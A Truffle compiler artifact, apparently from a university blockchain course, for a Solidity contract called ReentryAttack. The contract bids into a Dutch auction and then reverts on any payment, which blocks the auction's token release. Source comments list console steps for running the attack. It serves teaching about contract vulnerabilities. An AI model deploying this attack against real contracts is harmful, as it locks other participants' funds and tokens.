{
  "contractName": "ReentryAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "auctionAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "commit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"auctionAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"commit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol\":\"ReentryAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/AuctionAgainstReentry.sol\":{\"keccak256\":\"0x5f59ec45abc81784ca2cecdfcd834df3d1506cdcea019cbe6ced783c96ed6163\",\"urls\":[\"bzz-raw://e12d3d48717754852f2267f15e33c7d2f8dd71f48497042cf09dcc6cb37b2870\",\"dweb:/ipfs/Qmd9B9hQ4jp3wDNKTUsiQpJpm76PGQXVqAj56sbUPCLRmt\"]},\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/CypherpunkCoin.sol\":{\"keccak256\":\"0x4aefb3464c072e8ef70e11cec33e34830ef028617bb47fb1851189e02de2ccd5\",\"urls\":[\"bzz-raw://c68320b2bca5e8ee0835a728bfd8495f8781abe9e7c5ebfb60983489783f8738\",\"dweb:/ipfs/Qmf2kwxEavxDQCQ1SMCgtGBqouw4mJ59sS5NC9brC1eY2s\"]},\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol\":{\"keccak256\":\"0xf01db39b24d1b2fc27af6bd3828d097c6a4919b99fc81b0d0049093c92b4bf8c\",\"urls\":[\"bzz-raw://44c3d88b960e5bb4d36037b11be867d85da3c59ed5b59267506cdc7ebb78f98f\",\"dweb:/ipfs/QmZg4s2hCtRuafJRdjG6sLRDDTnMpvEDwmuiqskKo4ySwe\"]},\"@openzeppelin/contracts/GSN/Context.sol\":{\"keccak256\":\"0xdb26cbf4d028490f49831a7865c2fe1b28db44b535ca8d343785a3b768aae183\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://840b14ce0315c47d49ba328f1f9fa7654ded1c9e1559e6c5e777a7b2dc28bf0a\",\"dweb:/ipfs/QmTLLabn4wcfGro9LEmUXUN2nwKqZSotXMvjDCLXEnLtZP\"]},\"@openzeppelin/contracts/access/AccessControl.sol\":{\"keccak256\":\"0x92f7900d382761c7faefeaced81c6b4f1aae909ed0551803bfe8f27101956360\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://407c0864143968542e5cf5aa7556916d2cf292b201e3dadb65662e9a3aa24187\",\"dweb:/ipfs/QmSnXzYAUaGLGr7uofRbgQraTJvatbjQLBPhyYiMd18oUJ\"]},\"@openzeppelin/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x9a9cf02622cd7a64261b10534fc3260449da25c98c9e96d1b4ae8110a20e5806\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://2df142592d1dc267d9549049ee3317fa190d2f87eaa565f86ab05ec83f7ab8f5\",\"dweb:/ipfs/QmSkJtcfWo7c42KnL5hho6GFxK6HRNV91XABx1P7xDtfLV\"]},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0x91e0bd6a6762d2a1700dab0849de8422611355100576c4beef1e80d82a4104a0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://73bbd77af0a8b07255d2ffa20728bcf13b116007c9ddac5d37046cfabb0e1e02\",\"dweb:/ipfs/QmRgZgWCWCSMTTaok6o4QvWA6MgB4goS8qpb3sN7bAvaZ9\"]},\"@openzeppelin/contracts/token/ERC20/ERC20Burnable.sol\":{\"keccak256\":\"0x657b0d90be17331364211d74359df2a734fac864f6e88c80de7626fa33090ffb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://09cca25fefa2354a424d55a97930c76b11dc50697ba62c85d7affc27a37e830c\",\"dweb:/ipfs/QmPTQBYXxQDSNmMKqwe4WnM8E7NwnpLnkFLSRH8hZRvrVK\"]},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x5c26b39d26f7ed489e555d955dcd3e01872972e71fdd1528e93ec164e4f23385\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://efdc632af6960cf865dbc113665ea1f5b90eab75cc40ec062b2f6ae6da582017\",\"dweb:/ipfs/QmfAZFDuG62vxmAN9DnXApv7e7PMzPqi4RkqqZHLMSQiY5\"]},\"@openzeppelin/contracts/utils/Address.sol\":{\"keccak256\":\"0xf5fa8cbdffa5ef8be49b246b5628facc30b71707e78a45d80d93b64eff3fe390\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://774e78a9ff32792cc95db4d2ceaf3a7965bb7f0bea5e6cb7cff182b450d44b37\",\"dweb:/ipfs/QmRRMC4uj7eAcLW7chynA3sNEYULMFazdLwQHKHQPyzAbA\"]},\"@openzeppelin/contracts/utils/EnumerableSet.sol\":{\"keccak256\":\"0xb2a11b236f073662f5a196995863f51c11d006bf7c3de158b316dfa1506c4b79\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8651649cf0b9efa18c3b01c030276fa320d41adbdc286833417e7f36e357b2f3\",\"dweb:/ipfs/QmafhM2Nd1aP43QVB1eRRZaqRXQKswNfQcWi8U8xjrxCfN\"]}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b5060405161028c38038061028c8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101b7806100d56000396000f3fe6080604052600436106100225760003560e01c80633c7a3aff1461009a57610095565b36610095576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f596f7520617265206861636b65642c206861686100000000000000000000000081525060200191505060405180910390fd5b600080fd5b6100a26100a4565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100fe57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633c7a3aff346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561016657600080fd5b505af115801561017a573d6000803e3d6000fd5b505050505056fea26469706673582212202f1376e4915e5116009b1d08e7f02ef734eba49d10f251d40d884cbec11126a864736f6c634300060c0033",
  "deployedBytecode": "0x6080604052600436106100225760003560e01c80633c7a3aff1461009a57610095565b36610095576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f596f7520617265206861636b65642c206861686100000000000000000000000081525060200191505060405180910390fd5b600080fd5b6100a26100a4565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100fe57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633c7a3aff346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561016657600080fd5b505af115801561017a573d6000803e3d6000fd5b505050505056fea26469706673582212202f1376e4915e5116009b1d08e7f02ef734eba49d10f251d40d884cbec11126a864736f6c634300060c0033",
  "immutableReferences": {},
  "sourceMap": "905:419:4:-:0;;;979:124;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1051:14;1033:7;;:33;;;;;;;;;;;;;;;;;;1085:10;1077:5;;:18;;;;;;;;;;;;;;;;;;979:124;905:419;;;;;;",
  "deployedSourceMap": "905:419:4:-:0;;;;;;;;;;;;;;;;;;;;;;;1283:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;905:419;;;;1111:126;;;:::i;:::-;;;1179:5;;;;;;;;;;;1165:19;;:10;:19;;;1157:28;;;;;;1196:7;;;;;;;;;;:14;;;1217:9;1196:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1111:126::o",
  "source": "pragma solidity ^0.6.0;\r\n\r\nimport \"./AuctionAgainstReentry.sol\";\r\nimport \"./CypherpunkCoin.sol\";\r\n\r\n// auction.startPrice() * 10**12 * auction.tokenSupply()\r\n// address(auction).delegatecall(abi.encodeWithSignature(\"commit()\"));\r\n\r\n// the trick is try to become the last bidder and exploit releaseTokens as\r\n// it transfer ether to an external agent\r\n\r\n// this reentry attack will work with the auction\r\n// of startPrice = 3000, endingPrice = 2000 and supply = 200 in 5 minutes\r\n// here we attack the method releaseTokens\r\n// the amount of commit is 1 Eth, which makes demand higher than the supply\r\n// and this contract will be the last bidder\r\n// however, when others want to release the tokens, Auction contract\r\n// will have to pay this contract, and call the payable function, which\r\n// call release tokens again and generate errors\r\n// therefore, no one can claim the tokens because of this attack\r\ncontract ReentryAttack {\r\n    Auction auction;\r\n    address owner;\r\n\r\n    constructor(address auctionAddress) public {\r\n        auction = Auction(auctionAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function commit() external payable {\r\n        require(msg.sender == owner);\r\n        auction.commit.value(msg.value)();\r\n    }\r\n\r\n    receive() external payable {\r\n        revert(\"You are hacked, haha\");\r\n    }\r\n}\r\n\r\n// these lines are instructions to attack\r\n// truffle migrate --reset\r\n// truffle console\r\n// cypherPunk = await CypherpunkCoin.deployed()\r\n// cypherPunk.createAuction(3000,2000,200,5)\r\n// auctionAddress = await cypherPunk.auctionAddress()\r\n// attack = await ReentryAttack.new(auctionAddress)\r\n// cypherPunk.openCurrAuction()\r\n// auction = await Auction.at(auctionAddress)\r\n// auction.commit({value: 100000000000000000, from:accounts[1]}) // send from accounts[1]\r\n// attack.commit({value: 1000000000000000000})\r\n// auction.releaseTokens() --> can not release\r\n",
  "sourcePath": "F:/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
  "ast": {
    "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
    "exportedSymbols": {
      "ReentryAttack": [
        1289
      ]
    },
    "id": 1290,
    "license": null,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1236,
        "literals": [
          "solidity",
          "^",
          "0.6",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:23:4"
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/AuctionAgainstReentry.sol",
        "file": "./AuctionAgainstReentry.sol",
        "id": 1237,
        "nodeType": "ImportDirective",
        "scope": 1290,
        "sourceUnit": 1061,
        "src": "27:37:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/CypherpunkCoin.sol",
        "file": "./CypherpunkCoin.sol",
        "id": 1238,
        "nodeType": "ImportDirective",
        "scope": 1290,
        "sourceUnit": 1202,
        "src": "66:30:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 1289,
        "linearizedBaseContracts": [
          1289
        ],
        "name": "ReentryAttack",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 1240,
            "mutability": "mutable",
            "name": "auction",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1289,
            "src": "935:15:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Auction_$1060",
              "typeString": "contract Auction"
            },
            "typeName": {
              "contractScope": null,
              "id": 1239,
              "name": "Auction",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 1060,
              "src": "935:7:4",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Auction_$1060",
                "typeString": "contract Auction"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 1242,
            "mutability": "mutable",
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1289,
            "src": "957:13:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 1241,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "957:7:4",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 1258,
              "nodeType": "Block",
              "src": "1022:81:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1251,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1247,
                      "name": "auction",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1240,
                      "src": "1033:7:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$1060",
                        "typeString": "contract Auction"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 1249,
                          "name": "auctionAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1244,
                          "src": "1051:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 1248,
                        "name": "Auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1060,
                        "src": "1043:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Auction_$1060_$",
                          "typeString": "type(contract Auction)"
                        }
                      },
                      "id": 1250,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1043:23:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$1060",
                        "typeString": "contract Auction"
                      }
                    },
                    "src": "1033:33:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Auction_$1060",
                      "typeString": "contract Auction"
                    }
                  },
                  "id": 1252,
                  "nodeType": "ExpressionStatement",
                  "src": "1033:33:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1256,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1253,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1242,
                      "src": "1077:5:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 1254,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "1085:3:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 1255,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1085:10:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "1077:18:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 1257,
                  "nodeType": "ExpressionStatement",
                  "src": "1077:18:4"
                }
              ]
            },
            "documentation": null,
            "id": 1259,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1245,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 1244,
                  "mutability": "mutable",
                  "name": "auctionAddress",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 1259,
                  "src": "991:22:4",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1243,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "991:7:4",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "990:24:4"
            },
            "returnParameters": {
              "id": 1246,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1022:0:4"
            },
            "scope": 1289,
            "src": "979:124:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1279,
              "nodeType": "Block",
              "src": "1146:91:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 1266,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1263,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1165:3:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 1264,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "1165:10:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "argumentTypes": null,
                          "id": 1265,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1242,
                          "src": "1179:5:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "1165:19:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 1262,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1157:7:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 1267,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1157:28:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1268,
                  "nodeType": "ExpressionStatement",
                  "src": "1157:28:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1274,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1217:3:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 1275,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "1217:9:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        ],
                        "expression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1269,
                            "name": "auction",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1240,
                            "src": "1196:7:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Auction_$1060",
                              "typeString": "contract Auction"
                            }
                          },
                          "id": 1272,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "commit",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 865,
                          "src": "1196:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_payable$__$returns$__$",
                            "typeString": "function () payable external"
                          }
                        },
                        "id": 1273,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1196:20:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_external_payable$__$returns$__$value_$",
                          "typeString": "function (uint256) pure returns (function () payable external)"
                        }
                      },
                      "id": 1276,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1196:31:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 1277,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1196:33:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1278,
                  "nodeType": "ExpressionStatement",
                  "src": "1196:33:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "3c7a3aff",
            "id": 1280,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "commit",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1260,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1126:2:4"
            },
            "returnParameters": {
              "id": 1261,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1146:0:4"
            },
            "scope": 1289,
            "src": "1111:126:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 1287,
              "nodeType": "Block",
              "src": "1272:49:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "hexValue": "596f7520617265206861636b65642c2068616861",
                        "id": 1284,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1290:22:4",
                        "subdenomination": null,
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_32c1a1421c0407123526da9ce5266a7ff2762a7a95918502cb615c08c85d5fc1",
                          "typeString": "literal_string \"You are hacked, haha\""
                        },
                        "value": "You are hacked, haha"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_32c1a1421c0407123526da9ce5266a7ff2762a7a95918502cb615c08c85d5fc1",
                          "typeString": "literal_string \"You are hacked, haha\""
                        }
                      ],
                      "id": 1283,
                      "name": "revert",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -19,
                        -19
                      ],
                      "referencedDeclaration": -19,
                      "src": "1283:6:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_revert_pure$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (string memory) pure"
                      }
                    },
                    "id": 1285,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1283:30:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1286,
                  "nodeType": "ExpressionStatement",
                  "src": "1283:30:4"
                }
              ]
            },
            "documentation": null,
            "id": 1288,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1281,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1252:2:4"
            },
            "returnParameters": {
              "id": 1282,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1272:0:4"
            },
            "scope": 1289,
            "src": "1245:76:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1290,
        "src": "905:419:4"
      }
    ],
    "src": "0:1889:4"
  },
  "legacyAST": {
    "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
    "exportedSymbols": {
      "ReentryAttack": [
        1289
      ]
    },
    "id": 1290,
    "license": null,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1236,
        "literals": [
          "solidity",
          "^",
          "0.6",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:23:4"
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/AuctionAgainstReentry.sol",
        "file": "./AuctionAgainstReentry.sol",
        "id": 1237,
        "nodeType": "ImportDirective",
        "scope": 1290,
        "sourceUnit": 1061,
        "src": "27:37:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/CypherpunkCoin.sol",
        "file": "./CypherpunkCoin.sol",
        "id": 1238,
        "nodeType": "ImportDirective",
        "scope": 1290,
        "sourceUnit": 1202,
        "src": "66:30:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 1289,
        "linearizedBaseContracts": [
          1289
        ],
        "name": "ReentryAttack",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 1240,
            "mutability": "mutable",
            "name": "auction",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1289,
            "src": "935:15:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Auction_$1060",
              "typeString": "contract Auction"
            },
            "typeName": {
              "contractScope": null,
              "id": 1239,
              "name": "Auction",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 1060,
              "src": "935:7:4",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Auction_$1060",
                "typeString": "contract Auction"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 1242,
            "mutability": "mutable",
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1289,
            "src": "957:13:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 1241,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "957:7:4",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 1258,
              "nodeType": "Block",
              "src": "1022:81:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1251,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1247,
                      "name": "auction",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
